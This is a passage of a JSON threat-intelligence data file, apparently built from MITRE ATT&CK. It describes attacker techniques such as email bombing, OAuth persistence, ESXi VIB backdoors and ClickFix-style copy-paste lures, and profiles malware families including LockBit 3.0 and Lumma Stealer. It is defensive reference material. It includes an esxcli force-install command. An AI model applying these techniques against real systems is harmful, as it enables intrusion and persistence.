      "has deployed large volumes of non-malicious email spam to victims in order to prompt follow-on interactions with the threat actor posing as IT support or helpdesk to resolve the problem."
    ],
    "description": "Adversaries may flood targeted email addresses with an overwhelming volume of messages. This may bury legitimate emails in a flood of spam and disrupt business operations.(Citation: sophos-bombing)(Citation: krebs-email-bombing)An adversary may accomplish email bombing by leveraging an automated bot to register a targeted address for e-mail lists that do not validate new signups, such as online newsletters. The result can be a wave of thousands of e-mails that effectively overloads the victims inbox.(Citation: krebs-email-bombing)(Citation: hhs-email-bombing)By sending hundreds or thousands of e-mails in quick succession, adversaries may successfully divert attention away from and bury legitimate messages including security alerts, daily business processes like help desk tickets and client correspondence, or ongoing scams.(Citation: hhs-email-bombing) This behavior can also be used as a tool of harassment.(Citation: krebs-email-bombing)This behavior may be a precursor for [Spearphishing Voice](https://attack.mitre.org/techniques/T1566/004). For example, an adversary may email bomb a target and then follow up with a phone call to fraudulently offer assistance. This social engineering may lead to the use of [Remote Access Software](https://attack.mitre.org/techniques/T1663) to steal credentials, deploy ransomware, conduct [Financial Theft](https://attack.mitre.org/techniques/T1657)(Citation: sophos-bombing), or engage in other malicious activity.(Citation: rapid7-email-bombing)",
    "similar_words": [
      "Email Bombing"
    ],
    "id": "T1667"
  },
  "attack-pattern--c31aebd6-c9b5-420f-ba2a-5853bbf897fa": {
    "name": "Cloud Application Integration",
    "example_uses": [],
    "description": "Adversaries may achieve persistence by leveraging OAuth application integrations in a software-as-a-service environment. Adversaries may create a custom application, add a legitimate application into the environment, or even co-opt an existing integration to achieve malicious ends.(Citation: Push Security SaaS Persistence 2022)(Citation: SaaS Attacks GitHub Evil Twin Integrations)OAuth is an open standard that allows users to authorize applications to access their information on their behalf. In a SaaS environment such as Microsoft 365 or Google Workspace, users may integrate applications to improve their workflow and achieve tasks.  Leveraging application integrations may allow adversaries to persist in an environment  for example, by granting consent to an application from a high-privileged adversary-controlled account in order to maintain access to its data, even in the event of losing access to the account.(Citation: Wiz Midnight Blizzard 2024)(Citation: Microsoft Malicious OAuth Applications 2022)(Citation: Huntress Persistence Microsoft 365 Compromise 2024) In some cases, integrations may remain valid even after the original consenting user account is disabled.(Citation: Push Security Slack Persistence 2023) Application integrations may also allow adversaries to bypass multi-factor authentication requirements through the use of [Application Access Token](https://attack.mitre.org/techniques/T1550/001)s. Finally, they may enable persistent [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) over time.(Citation: Synes Cyber Corner Malicious Azure Application 2023)Creating or adding a new application may require the adversary to create a dedicated [Cloud Account](https://attack.mitre.org/techniques/T1136/003) for the application and assign it [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)  for example, in Microsoft 365 environments, an application can only access resources via an associated service principal.(Citation: Microsoft Entra ID Service Principals)  ",
    "similar_words": [
      "Cloud Application Integration"
    ],
    "id": "T1671"
  },
  "attack-pattern--d2d642da-61ff-4211-b4df-7923c9ca220c": {
    "name": "Hypervisor CLI",
    "example_uses": [
      "Cheerscrypt has leveraged `esxcli` in order to terminate running virtual machines.",
      "Royal ransomware uses `esxcli` to gather a list of running VMs and terminate them."
    ],
    "description": "Adversaries may abuse hypervisor command line interpreters (CLIs) to execute malicious commands. Hypervisor CLIs typically enable a wide variety of functionality for managing both the hypervisor itself and the guest virtual machines it hosts. For example, on ESXi systems, tools such as `esxcli` and `vim-cmd` allow administrators to configure firewall rules and log forwarding on the hypervisor, list virtual machines, start and stop virtual machines, and more.(Citation: Broadcom ESXCLI Reference)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: LOLESXi) Adversaries may be able to leverage these tools in order to support further actions, such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).",
    "similar_words": [
      "Hypervisor CLI"
    ],
    "id": "T1059.012"
  },
  "attack-pattern--d4287702-e2f7-4946-bdfa-2c7f5aaa5032": {
    "name": "Remote Desktop Software",
    "example_uses": [
      "has used the malware variant TerraTV to run a legitimate TeamViewer application to connect to compromised machines.",
      "has abused multiple types of legitimate remote access software and tools such as ScreenConnect NetSupport Manager and AnyDesk.",
      "has installed TeamViewer on targeted systems.",
      "During  the threat actors used AnyDesk to transfer tools between systems.",
      "has used a modified TeamViewer client as a command and control channel.",
      "used a cloud-based remote access software called LogMeIn for their attacks.",
      "has used a modified version of TeamViewer and Remote Utilities for remote access.",
      "During  the threat actors installed the AnyDesk remote desktop application onto the compromised network."
    ],
    "description": "An adversary may use legitimate desktop support software to establish an interactive command and control channel to target systems within networks. Desktop support software provides a graphical interface for remotely controlling another computer, transmitting the display output, keyboard input, and mouse control between devices using various protocols. Desktop support software, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)  Remote access modules/features may also exist as part of otherwise existing software such as Zoom or Google Chromes Remote Desktop.(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop) ",
    "similar_words": [
      "Remote Desktop Software"
    ],
    "id": "T1219.002"
  },
  "attack-pattern--dff263cc-328e-42b4-afbc-1fee8b6a8913": {
    "name": "Exclusive Control",
    "example_uses": [],
    "description": "Adversaries who successfully compromise a system may attempt to maintain persistence by closing the door behind them   in other words, by preventing other threat actors from initially accessing or maintaining a foothold on the same system. For example, adversaries may patch a vulnerable, compromised system(Citation: Mandiant-iab-control)(Citation: CERT AT Fortinent Ransomware 2025) to prevent other threat actors from leveraging that vulnerability in the future. They may close the door in other ways, such as disabling vulnerable services(Citation: sophos-multiple-attackers), stripping privileges from accounts(Citation: aquasec-postgres-processes), or removing other malware already on the compromised device.(Citation: fsecure-netsky)Hindering other threat actors may allow an adversary to maintain sole access to a compromised system or network. This prevents the threat actor from needing to compete with or even being removed themselves by other threat actors. It also reduces the noise in the environment, lowering the possibility of being caught and evicted by defenders. Finally, in the case of [Resource Hijacking](https://attack.mitre.org/techniques/T1496), leveraging a compromised devices full power allows the threat actor to maximize profit.(Citation: sophos-multiple-attackers)",
    "similar_words": [
      "Exclusive Control"
    ],
    "id": "T1668"
  },
  "attack-pattern--e1c2db92-7ae3-4e6a-90b4-157c1c1565cb": {
    "name": "Email Spoofing",
    "example_uses": [],
    "description": "Adversaries may fake, or spoof, a senders identity by modifying the value of relevant email headers in order to establish contact with victims under false pretenses.(Citation: Proofpoint TA427 April 2024) In addition to actual email content, email headers (such as the FROM header, which contains the email address of the sender) may also be modified. Email clients display these headers when emails appear in a victim's inbox, which may cause modified emails to appear as if they were from the spoofed entity. This behavior may succeed when the spoofed entity either does not enable or enforce identity authentication tools such as Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and/or Domain-based Message Authentication, Reporting and Conformance (DMARC).(Citation: Cloudflare DMARC, DKIM, and SPF)(Citation: DMARC-overview)(Citation: Proofpoint-DMARC) Even if SPF and DKIM are configured properly, spoofing may still succeed when a domain sets a weak DMARC policy such as `v=DMARC1; p=none; fo=1;`. This means that while DMARC is technically present, email servers are not instructed to take any filtering action when emails fail authentication checks.(Citation: Proofpoint TA427 April 2024)(Citation: ic3-dprk)Adversaries may abuse absent or weakly configured SPF, SKIM, and/or DMARC policies to conceal social engineering attempts(Citation: ic3-dprk) such as [Phishing](https://attack.mitre.org/techniques/T1566). They may also leverage email spoofing for [Impersonation](https://attack.mitre.org/techniques/T1656) of legitimate external individuals and organizations, such as journalists and academics.(Citation: ic3-dprk)",
    "similar_words": [
      "Email Spoofing"
    ],
    "id": "T1672"
  },
  "attack-pattern--e261a979-f354-41a8-963e-6cadac27c4bf": {
    "name": "Malicious Copy and Paste",
    "example_uses": [],
    "description": "An adversary may rely upon a user copying and pasting code in order to gain execution. Users may be subjected to social engineering to get them to copy and paste code directly into a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).  Malicious websites, such as those used in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), may present fake error messages or CAPTCHA prompts that instruct users to open a terminal or the Windows Run Dialog box and execute an arbitrary command. These commands may be obfuscated using encoding or other techniques to conceal malicious intent. Once executed, the adversary will typically be able to establish a foothold on the victim's machine.(Citation: CloudSEK Lumma Stealer 2024)(Citation: Sekoia ClickFake 2025)(Citation: Reliaquest CAPTCHA 2024)(Citation: AhnLab LummaC2 2025)Adversaries may also leverage phishing emails for this purpose. When a user attempts to open an attachment, they may be presented with a fake error and offered a malicious command to paste as a solution.(Citation: Proofpoint ClickFix 2024)(Citation: AhnLab Malicioys Copy Paste 2024)Tricking a user into executing a command themselves may help to bypass email filtering, browser sandboxing, or other mitigations designed to protect users against malicious downloaded files. ",
    "similar_words": [
      "Malicious Copy and Paste"
    ],
    "id": "T1204.004"
  },
  "attack-pattern--f8ba7d61-11c5-4130-bafd-7c3ff5fbf4b5": {
    "name": "vSphere Installation Bundles",
    "example_uses": [],
    "description": "Adversaries may abuse vSphere Installation Bundles (VIBs) to establish persistent access to ESXi hypervisors. VIBs are collections of files used for software distribution and virtual system management in VMware environments. Since ESXi uses an in-memory filesystem where changes made to most files are stored in RAM rather than in persistent storage, these modifications are lost after a reboot. However, VIBs can be used to create startup tasks, apply custom firewall rules, or deploy binaries that persist across reboots. Typically, administrators use VIBs for updates and system maintenance.VIBs can be broken down into three components:(Citation: VMware VIBs)* VIB payload: a `.vgz` archive containing the directories and files to be created and executed on boot when the VIBs are loaded.  * Signature file: verifies the host acceptance level of a VIB, indicating what testing and validation has been done by VMware or its partners before publication of a VIB. By default, ESXi hosts require a minimum acceptance level of PartnerSupported for VIB installation, meaning the VIB is published by a trusted VMware partner. However, privileged users can change the default acceptance level using the `esxcli` command line interface. Additionally, VIBs are able to be installed regardless of acceptance level by using the  esxcli software vib install --force command. * XML descriptor file: a configuration file containing associated VIB metadata, such as the name of the VIB and its dependencies.  Adversaries may leverage malicious VIB packages to maintain persistent access to ESXi hypervisors, allowing system changes to be executed upon each bootup of ESXi  such as using  `esxcli` to enable firewall rules for backdoor traffic, creating listeners on hard coded ports, and executing backdoors.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022) Adversaries may also masquerade their malicious VIB files as PartnerSupported by modifying the XML descriptor file.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)",
    "similar_words": [
      "vSphere Installation Bundles"
    ],
    "id": "T1505.006"
  },
  "attack-pattern--fbd91bfc-75c2-4f0c-8116-3b4e722906b3": {
    "name": "Compression",
    "example_uses": [
      "attachments have been delivered via compressed archive files.",
      "has been delivered as compressed RAR payloads in ZIP files to victims.",
      "has delivered compressed payloads in ZIP files to victims.",
      "has been delivered to targets as various archive files including ZIP 7-ZIP and RAR.",
      "has delivered compressed executables within ZIP files to victims.",
      "uses a ZIP payload that is automatically extracted with its contents a LUA script executed for initial execution via CVE-2024-20359.",
      "malware is compressed with LZNT1 compression.",
      "has been compressed with LZW algorithm.",
      "has been compressed and stored within a registry key.",
      "can be delivered as a compressed encrypted and encoded payload.",
      "has been delivered via JScript files in a ZIP archive.",
      "strings were compressed and encoded in Base64.",
      "has been compressed and obfuscated.",
      "can deliver its final payload as a compressed encrypted and base64-encoded blob.",
      "has the ability to encrypt and compress its payload.",
      "has the ability to compress stings with QuickLZ.",
      "can be compressed with the ApLib algorithm.",
      "used Base64 encoded compressed payloads.",
      "can compress 32-bit and 64-bit driver files with the Lempel-Ziv algorithm.",
      "has been delivered as a package that includes compressed DLL and shellcode payloads within a .dat file.",
      "can compress and obfuscate its strings to evade detection on a compromised host.",
      "can encrypt encode and compress multiple layers of shellcode.",
      "can generate encrypted compressed/encoded or otherwise obfuscated code modules.",
      "has used compressed and char-encoded scripts in operations.",
      "has compressed the  executable within malicious email attachments.",
      "has compressed its data with the LZSS algorithm.",
      "has obfuscated code using gzip compression.",
      "has the ability to compress its components.",
      "The  JavaScript payload has been delivered within a compressed ZIP archive."
    ],
    "description": "Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e., [Fileless Storage](https://attack.mitre.org/techniques/T1027/011)).(Citation: Trustwave Pillowmint June 2020)In order to further evade detection, adversaries may combine multiple ZIP files into one archive. This process of concatenation creates an archive that appears to be a single archive but in fact contains the central directories of the embedded archives. Some ZIP readers, such as 7zip, may not be able to identify concatenated ZIP files and miss the presence of the malicious payload.(Citation: Perception Point)File archives may be sent as one [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) through email. Adversaries have sent malicious payloads as archived files to encourage the user to interact with and extract the malicious payload onto their system (i.e., [Malicious File](https://attack.mitre.org/techniques/T1204/002)).(Citation: NTT Security Flagpro new December 2021) However, some file compression tools, such as 7zip, can be used to produce self-extracting archives. Adversaries may send self-extracting archives to hide the functionality of their payload and launch it without requiring multiple actions from the user.(Citation: The Hacker News)[Compression](https://attack.mitre.org/techniques/T1027/015) may be used in combination with [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013) where compressed files are encrypted and password-protected.",
    "similar_words": [
      "Compression"
    ],
    "id": "T1027.015"
  },
  "attack-pattern--fde016f6-211a-41c8-a4ab-301f1e419c62": {
    "name": "Wi-Fi Networks",
    "example_uses": [
      "has exploited open Wi-Fi access points for initial access to target devices using the network.",
      "During   established wireless connections to secure enterprise Wi-Fi networks belonging to a target organization for initial access into the environment."
    ],
    "description": "Adversaries may gain initial access to target systems by connecting to wireless networks. They may accomplish this by exploiting open Wi-Fi networks used by target devices or by accessing secured Wi-Fi networks  requiring [Valid Accounts](https://attack.mitre.org/techniques/T1078)  belonging to a target organization.(Citation: DOJ GRU Charges 2018)(Citation: Nearest Neighbor Volexity) Establishing a connection to a Wi-Fi access point requires a certain level of proximity to both discover and maintain a stable network connection. Adversaries may establish a wireless connection through various methods, such as by physically positioning themselves near a Wi-Fi network to conduct close access operations. To bypass the need for physical proximity, adversaries may attempt to remotely compromise nearby third-party systems that have both wired and wireless network connections available (i.e., dual-homed systems). These third-party compromised devices can then serve as a bridge to connect to a targets Wi-Fi network.(Citation: Nearest Neighbor Volexity)Once an initial wireless connection is achieved, adversaries may leverage this access for follow-on activities in the victim network or further targeting of specific devices on the network. Adversaries may perform [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) activities for [Credential Access](https://attack.mitre.org/tactics/TA0006) or [Discovery](https://attack.mitre.org/tactics/TA0007).",
    "similar_words": [
      "Wi-Fi Networks"
    ],
    "id": "T1669"
  },
  "malware--00936d7a-451d-4a9c-88fc-05b141aa2d3f": {
    "name": "cd00r",
    "description": "[cd00r](https://attack.mitre.org/software/S1204) is an open-source backdoor for UNIX and UNIX-variant operating systems that was orginally released in 2000. [cd00r](https://attack.mitre.org/software/S1204) source code is primarily based on a packet-capturing program as it utilizes a sniffer to listen for specific sequences of network traffic or \"secret knock\" before executing the attacker's code.(Citation: Hartrell cd00r 2002)(Citation: Lumen J-Magic JAN 2025)\n\n",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "cd00r"
    ],
    "id": "S1204"
  },
  "malware--05489800-6c6f-4922-a0de-d573b333e612": {
    "name": "JumbledPath",
    "description": "[JumbledPath](https://attack.mitre.org/software/S1206) is a custom-built utility written in GO that has been used by [Salt Typhoon](https://attack.mitre.org/groups/G1045) since at least 2024 for packet capture on remote Cisco devices. [JumbledPath](https://attack.mitre.org/software/S1206) is compiled as an ELF binary using x86-64 architecture which makes it potentially useable across Linux operating systems and network devices from multiple vendors.(Citation: Cisco Salt Typhoon FEB 2025)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "JumbledPath"
    ],
    "id": "S1206"
  },
  "malware--0659f55c-3b68-4e5d-8071-12ded6684731": {
    "name": "NICECURL",
    "description": "[NICECURL](https://attack.mitre.org/software/S1192) is a VBScript-based backdoor used by [APT42](https://attack.mitre.org/groups/G1044) to download additional modules.(Citation: Mandiant APT42-untangling)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "NICECURL"
    ],
    "id": "S1192"
  },
  "malware--0e17b066-50dd-4c2f-83bf-205c5eb2bb34": {
    "name": "reGeorg",
    "description": "[reGeorg](https://attack.mitre.org/software/S1187) is an open-source web shell written in Python that can be used as a proxy to bypass firewall rules and tunnel data in and out of targeted networks.(Citation: Fortinet reGeorg MAR 2019)(Citation: GitHub reGeorg 2016)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "reGeorg"
    ],
    "id": "S1187"
  },
  "malware--12fdf05a-4bd1-4f45-9cde-d3af35f82db1": {
    "name": "TAMECAT",
    "description": "[TAMECAT](https://attack.mitre.org/software/S1193) is a malware that is used by [APT42](https://attack.mitre.org/groups/G1044) to execute PowerShell or C# content.(Citation: Mandiant APT42-untangling) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "TAMECAT"
    ],
    "id": "S1193"
  },
  "malware--16662bee-9d15-4564-a128-1fce214866e9": {
    "name": "RansomHub",
    "description": "[RansomHub](https://attack.mitre.org/software/S1212) is a ransomware-as-a-service (RaaS) offering with Windows, ESXi, Linux, and FreeBSD versions that has been in use since at least 2024 to target organizations in multiple sectors globally. [RansomHub](https://attack.mitre.org/software/S1212) operators may have purchased and rebranded resources from Knight  (formerly Cyclops) Ransomware which shares infrastructure, feature, and code overlaps with [RansomHub](https://attack.mitre.org/software/S1212).(Citation: CISA RansomHub AUG 2024)(Citation: Group-IB RansomHub FEB 2025)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "RansomHub"
    ],
    "id": "S1212"
  },
  "malware--2692bdd0-da52-44ff-88a3-9db28b948ea2": {
    "name": "UPSTYLE",
    "description": "[UPSTYLE](https://attack.mitre.org/software/S1164) is a Python-based backdoor associated with exploitation of Palo Alto firewalls using CVE-2024-3400 in early 2024. [UPSTYLE](https://attack.mitre.org/software/S1164) has only been observed in relation to this exploitation activity, which involved attempted install on compromised devices by the threat actor UTA0218.(Citation: Volexity UPSTYLE 2024)(Citation: Palo Alto MidnightEclipse APR 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "UPSTYLE"
    ],
    "id": "S1164"
  },
  "malware--273e2b53-64ec-48be-9ad9-8f3dc0e53718": {
    "name": "Hannotog",
    "description": "[Hannotog](https://attack.mitre.org/software/S1211) is a type of backdoor malware uniquely assoicated with [Lotus Blossom](https://attack.mitre.org/groups/G0030) operations since at least 2022.(Citation: Symantec Bilbug 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Hannotog"
    ],
    "id": "S1211"
  },
  "malware--2ade64da-5114-42e4-9d56-335379cca561": {
    "name": "J-magic",
    "description": "[J-magic](https://attack.mitre.org/software/S1203) is a custom variant of the [cd00r](https://attack.mitre.org/software/S1204) backdoor tailored to target Juniper routers that was first observed during the [J-magic Campaign](https://attack.mitre.org/campaigns/C0050) in mid-2023. [J-magic](https://attack.mitre.org/software/S1203) monitors TCP traffic for five predefined parameters or \"magic packets\" to be sent by the attackers before activating on compromised devices.(Citation: Lumen J-Magic JAN 2025)\n\n",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "J-magic"
    ],
    "id": "S1203"
  },
  "malware--2c9d23e7-bfd6-4e23-a512-aee3bc1474f4": {
    "name": "PowerExchange",
    "description": "[PowerExchange](https://attack.mitre.org/software/S1173) is a PowerShell backdoor that has been used by [OilRig](https://attack.mitre.org/groups/G0049) since at least 2023 including against government targets in the Middle East.(Citation: Symantec Crambus OCT 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PowerExchange"
    ],
    "id": "S1173"
  },
  "malware--3128c86d-bd0d-445c-850f-96abf68fbfc3": {
    "name": "Gomir",
    "description": "Gomir is a Linux backdoor variant of the Go-based malware [GoBear](https://attack.mitre.org/software/S1197), uniquely assoicated with [Kimsuky](https://attack.mitre.org/groups/G0094) operations.(Citation: Symantec Troll Stealer 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Gomir"
    ],
    "id": "S1198"
  },
  "malware--325fa466-4a2a-45a0-acc6-f6bed9b45ebe": {
    "name": "BOLDMOVE",
    "description": "[BOLDMOVE](https://attack.mitre.org/software/S1184) is a type of backdoor malware written in C linked to People’s Republic of China operations from 2022 through 2023. [BOLDMOVE](https://attack.mitre.org/software/S1184) includes both Windows and Linux variants, with some Linux variants specifically designed for FortiGate Firewall devices. [BOLDMOVE](https://attack.mitre.org/software/S1184) is linked to zero-day exploitation of CVE-2022-42475 in FortiOSS SSL-VPNs.(Citation: Google Cloud BOLDMOVE 2023) The record for [BOLDMOVE](https://attack.mitre.org/software/S1184) only covers known Linux variants.",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BOLDMOVE"
    ],
    "id": "S1184"
  },
  "malware--3fc44c12-b16e-4de1-8869-cf0eb4446070": {
    "name": "ShrinkLocker",
    "description": "[ShrinkLocker](https://attack.mitre.org/software/S1178) is a VBS-based malicious script that leverages the legitimate Bitlocker application to encrypt files on victim systems for ransom. [ShrinkLocker](https://attack.mitre.org/software/S1178) functions by using Bitlocker to encrypt files, then renames impacted drives to the adversary’s contact email address to facilitate communication for the ransom payment.(Citation: Kaspersky ShrinkLocker 2024)(Citation: Splunk ShrinkLocker 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ShrinkLocker"
    ],
    "id": "S1178"
  },
  "malware--42bf4ce8-415f-40e3-98b3-e3811875b406": {
    "name": "ODAgent",
    "description": "[ODAgent](https://attack.mitre.org/software/S1170) is a C#/.NET downloader that has been used by [OilRig](https://attack.mitre.org/groups/G0049) since at least 2022 including against target organizations in Israel to download and execute payloads and to exfiltrate staged files.(Citation: ESET OilRig Downloaders DEC 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ODAgent"
    ],
    "id": "S1170"
  },
  "malware--42fdf9db-6005-4bb3-96f6-496b94ce519d": {
    "name": "BlackByte 2.0 Ransomware",
    "description": "[BlackByte 2.0 Ransomware](https://attack.mitre.org/software/S1181) is a replacement for [BlackByte Ransomware](https://attack.mitre.org/software/S1180). Unlike [BlackByte Ransomware](https://attack.mitre.org/software/S1180), [BlackByte 2.0 Ransomware](https://attack.mitre.org/software/S1181) does not have a common key for victim decryption. [BlackByte 2.0 Ransomware](https://attack.mitre.org/software/S1181) remains uniquely associated with [BlackByte](https://attack.mitre.org/groups/G1043) operations.(Citation: Microsoft BlackByte 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BlackByte 2.0 Ransomware"
    ],
    "id": "S1181"
  },
  "malware--4b1b3a36-bbd6-462c-9c03-7fd4fb5e0dfa": {
    "name": "AcidPour",
    "description": "[AcidPour](https://attack.mitre.org/software/S1167) is a variant of [AcidRain](https://attack.mitre.org/software/S1125) designed to impact a wider range of x86 architecture Linux devices. [AcidPour](https://attack.mitre.org/software/S1167) is an x86 ELF binary that expands on the targeted devices and locations in [AcidRain](https://attack.mitre.org/software/S1125) by including items such as Unsorted Block Image (UBI), Deice Mapper (DM), and various flash memory references. Based on this expanded targeting, [AcidPour](https://attack.mitre.org/software/S1167) can impact a variety of device types including IoT, networking, and ICS embedded device types.(Citation: SentinelOne AcidPour 2024) [AcidPour](https://attack.mitre.org/software/S1167) is a wiping payload associated with the [Sandworm Team](https://attack.mitre.org/groups/G0034) threat actor, and potentially linked to attacks against Ukrainian internet service providers (ISPs) in 2023.(Citation: CERT-UA TelecomAttack 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "AcidPour"
    ],
    "id": "S1167"
  },
  "malware--4b72b6a7-72be-45d9-af02-fdcf0fc6d358": {
    "name": "TRANSLATEXT",
    "description": "[TRANSLATEXT](https://attack.mitre.org/software/S1201) is malware that is believed to be used by [Kimsuky](https://attack.mitre.org/groups/G0094).(Citation: Zscaler Kimsuky TRANSLATEXT) [TRANSLATEXT](https://attack.mitre.org/software/S1201) masqueraded as a Google Translate extension for Google Chrome, but is actually a collection of four malicious Javascript files that perform defense evasion, information collection and exfiltration.(Citation: Zscaler Kimsuky TRANSLATEXT) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "TRANSLATEXT"
    ],
    "id": "S1201"
  },
  "malware--4c8ad4ed-3bbb-4088-bf14-f4caf2bf62a0": {
    "name": "Line Dancer",
    "description": "[Line Dancer](https://attack.mitre.org/software/S1186) is a memory-only Lua-based shellcode loader associated with the [ArcaneDoor](https://attack.mitre.org/campaigns/C0046) campaign. [Line Dancer](https://attack.mitre.org/software/S1186) allows an adversary to upload and execute arbitrary shellcode on victim devices.(Citation: Cisco ArcaneDoor 2024)(Citation: CCCS ArcaneDoor 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Line Dancer"
    ],
    "id": "S1186"
  },
  "malware--4e762e29-3c56-4a2b-b205-c5890c0856ed": {
    "name": "Megazord",
    "description": "[Megazord](https://attack.mitre.org/software/S1191) is a Rust-based variant of [Akira](https://attack.mitre.org/software/S1129) ransomware that has been in use since at least August 2023 to target Windows environments. [Megazord](https://attack.mitre.org/software/S1191) has been attributed to the [Akira](https://attack.mitre.org/groups/G1024) group based on overlapping infrastructure though is possibly not exclusive to the group.(Citation: CISA Akira Ransomware APR 2024)(Citation: Cisco Akira Ransomware OCT 2024)(Citation: Palo Alto Howling Scorpius DEC 2024)\n\n",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Megazord"
    ],
    "id": "S1191"
  },
  "malware--5a6fa62e-4ddf-4ae3-974a-f17f24058350": {
    "name": "SnappyTCP",
    "description": "[SnappyTCP](https://attack.mitre.org/software/S1163) is a web shell used by [Sea Turtle](https://attack.mitre.org/groups/G1041) between 2021 and 2023 against multiple victims. [SnappyTCP](https://attack.mitre.org/software/S1163) appears to be based on a public GitHub project that has since been removed from the code-sharing site. [SnappyTCP](https://attack.mitre.org/software/S1163) includes a simple reverse TCP shell for Linux and Unix environments with basic command and control capabilities.(Citation: PWC Sea Turtle 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SnappyTCP"
    ],
    "id": "S1163"
  },
  "malware--5b5d1e6c-e7de-4b46-ab8f-8556e8745927": {
    "name": "LightSpy",
    "description": "First observed in 2018, LightSpy is a modular malware family that initially targeted iOS devices in Southern Asia before expanding to Android and macOS platforms. It consists of a downloader, a main executable that manages network communications, and functionality-specific modules, typically implemented as `.dylib` files (iOS, macOS) or `.apk` files (Android). LightSpy can collect VoIP call recordings, SMS messages, and credential stores, which are then exfiltrated to a command and control (C2) server.(Citation: MelikovBlackBerry LightSpy 2024) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LightSpy"
    ],
    "id": "S1185"
  },
  "malware--5f8c69a5-7acd-4a36-a929-de558d9c8223": {
    "name": "Line Runner",
    "description": "[Line Runner](https://attack.mitre.org/software/S1188) is a persistent backdoor and web shell allowing threat actors to upload and execute arbitrary Lua scripts. [Line Runner](https://attack.mitre.org/software/S1188) is associated with the [ArcaneDoor](https://attack.mitre.org/campaigns/C0046) campaign.(Citation: CCCS ArcaneDoor 2024)(Citation: Cisco ArcaneDoor 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Line Runner"
    ],
    "id": "S1188"
  },
  "malware--6207dd22-bf18-4c96-aada-c573a9bbf5ec": {
    "name": "Exbyte",
    "description": "[Exbyte](https://attack.mitre.org/software/S1179) is an exfiltration tool written in Go that is uniquely associated with [BlackByte](https://attack.mitre.org/groups/G1043) operations. Observed since 2022, [Exbyte](https://attack.mitre.org/software/S1179) transfers collected files to online file sharing and hosting services.(Citation: Symantec BlackByte 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Exbyte"
    ],
    "id": "S1179"
  },
  "malware--674c514f-e485-47a8-9d49-1aaa70de155b": {
    "name": "Lumma Stealer",
    "description": "[Lumma Stealer](https://attack.mitre.org/software/S1213) is an information stealer malware family in use since at least 2022. [Lumma Stealer](https://attack.mitre.org/software/S1213) is a Malware as a Service (MaaS) where captured data has been sold in criminal markets to Initial Access Brokers.(Citation: Cybereason LumaStealer Undated)(Citation: Netskope LummaStealer 2025)(Citation: Qualys LummaStealer 2024)(Citation: Fortinet LummaStealer 2024)(Citation: TrendMicro LummaStealer 2025)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Lumma Stealer"
    ],
    "id": "S1213"
  },
  "malware--71fe9df1-1c6f-430c-ab9b-ff3c11074e52": {
    "name": "LockBit 3.0",
    "description": "[LockBit 3.0](https://attack.mitre.org/software/S1202) is an evolution of the LockBit Ransomware-as-a-Service (RaaS) offering with similarities to BlackMatter and [BlackCat](https://attack.mitre.org/software/S1068) ransomware. [LockBit 3.0](https://attack.mitre.org/software/S1202) has been in use since at least June 2022 and features enhanced defense evasion and exfiltration tactics, robust encryption methods for Windows and VMware ESXi systems, and a more refined RaaS structure over its predecessors such as [LockBit 2.0](https://attack.mitre.org/software/S1199).(Citation: Sentinel Labs LockBit 3.0 JUL 2022)(Citation: Joint Cybersecurity Advisory LockBit JUN 2023)(Citation: Joint Cybersecurity Advisory LockBit 3.0 MAR 2023)(Citation: INCIBE-CERT LockBit MAR 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LockBit 3.0"
    ],
    "id": "S1202"
  },
  "malware--7f269253-c225-45ff-87c2-5e8ef6dd369f": {
    "name": "Sagerunex",
